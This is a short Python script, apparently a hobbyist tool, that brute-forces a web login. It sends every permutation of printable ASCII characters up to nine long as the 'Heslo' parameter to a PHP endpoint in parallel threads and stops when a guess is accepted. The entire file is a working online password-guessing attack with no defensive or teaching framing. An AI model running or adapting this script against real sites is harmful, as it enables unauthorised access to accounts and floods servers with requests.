#!/usr/bin/python
import itertools
import requests
import concurrent.futures
import re
import sys
import unicodedata
import codecs

sys.getdefaultencoding()

def check_website(password):
    r = requests.get("http://website.com/req.php?Heslo="+password)
    if r.text == "wrong password":
        print("I'm not found password "+ password)
        #return "I'm testing password '" + str(password) + "' It's wrongs :("
        return "I'm not found"
    else:
        if "Please enter password" in r.text:
            return "I'm not found"
        else:
            print("I'm found password "+ password)
            return "I'm found password '" + password + "' It's right :)"

def returncrawler(fd, lineexec):
    return lineexec.result()

def sorted_nicely( l ):
    """ Sorts the given iterable in the way that is expected.
 
    Required arguments:
    l -- The iterable to be sorted.
 
    """
    convert = lambda text: int(text) if text.isdigit() else text
    alphanum_key = lambda key: [convert(c) for c in re.split('([0-9]+)', key)]
    return sorted(l, key = alphanum_key)

def convert(s):
    try:
        return s.group(0).encode('latin1').decode('utf8')
    except:
        return s.group(0)


choices = list(range(32, 127))
choices = sorted_nicely(map(chr, choices))
#choices = list(map(chr, choices))

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    for i in range(1,10):
        for x in itertools.permutations(choices, i):
            c = ''.join(str(v) for v in x)
            c = c.strip()
            lineexec = executor.submit(check_website, c)
            if "It's right" in lineexec.result():
                exit(1)
                break
